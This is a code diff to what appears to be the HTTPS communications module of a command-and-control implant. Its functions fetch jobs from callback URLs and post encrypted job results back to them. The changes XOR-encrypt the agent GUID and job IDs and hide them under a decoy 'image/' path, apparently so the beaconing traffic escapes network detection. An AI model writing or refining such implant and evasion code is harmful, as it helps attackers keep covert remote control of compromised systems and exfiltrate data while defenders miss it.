@@ -84,7 +84,9 @@ class HTTPS:
 
     public def KeyExchange(encryptedPubKey as (byte)) as (byte):
         for url in CallBackUrls:
-            BaseUrl = Uri(urljoin(url, _guid))
+            baseUrl0 = Uri(urljoin(url, ''))
+            crypt = encryptXOR(_guid.ToString())
+            BaseUrl = Uri(urljoin(baseUrl0, crypt))
             try:
                 r = Requests.Post(BaseUrl, encryptedPubKey)
                 return r.Bytes
@@ -95,10 +97,13 @@ class HTTPS:
 
     public def SendJobResults(encryptedResults as (byte), jobId as string):
         for url in CallBackUrls:
-            baseUrl = Uri(urljoin(url, _guid))
-            jobsUrl = Uri(urljoin(baseUrl, '/jobs'))
+            baseUrl0 = Uri(urljoin(url, ''))
+            crypt = encryptXOR(_guid.ToString())
+            jobsUrl0 = Uri(urljoin(baseUrl0, 'image/'))            
+            jobsUrl = Uri(urljoin(jobsUrl0, crypt))
             try:
-                jobUrl = Uri(urljoin(jobsUrl, "/$(jobId)"))
+                crypt2 = encryptXOR(jobId)
+                jobUrl = Uri(urljoin(jobsUrl, "/$(crypt2)"))
                 Requests.Post(jobUrl, encryptedResults)
                 return
             except e as Exception:
@@ -108,8 +113,10 @@ class HTTPS:
 
     public def GetJob() as (byte):
         for url in CallBackUrls:
-            baseUrl = Uri(urljoin(url, _guid))
-            jobsUrl = Uri(urljoin(baseUrl, '/jobs'))
+            baseUrl0 = Uri(urljoin(url, ''))
+            crypt = encryptXOR(_guid.ToString())
+            jobsUrl0 = Uri(urljoin(baseUrl0, 'image/'))            
+            jobsUrl = Uri(urljoin(jobsUrl0, crypt))
             try:
                 r = Requests.Get(jobsUrl)
                 return r.Bytes
